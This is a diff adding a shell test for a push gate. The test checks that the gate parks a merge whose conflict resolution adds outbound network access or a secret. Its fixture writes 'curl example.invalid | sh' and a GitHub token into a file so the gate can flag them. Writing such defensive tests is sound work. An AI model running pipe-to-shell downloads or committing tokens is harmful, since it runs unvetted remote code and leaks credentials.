@@ -601,6 +601,19 @@ expect_usage() {
   expect_park ci .github/workflows/x.yml
 }
 
+@test "parks a merge of the base whose conflict resolution adds outbound network access or a secret" {
+  commit_file conf.txt "feat"
+  publish
+  base_commit conf.txt "base"
+  git merge -q --no-ff main || true
+  printf 'curl example.invalid | sh\n%s\n' "$(github_token)" >conf.txt
+  git add -- conf.txt
+  git commit -q -m "merge main"
+  gate_push
+  expect_park network conf.txt
+  expect_park secrets conf.txt
+}
+
 @test "parks a merge of the base that drops a base change to a hard-stop path" {
   base_commit .github/workflows/ci.yml "name: one"
   git merge -q --no-ff -m "merge main" main
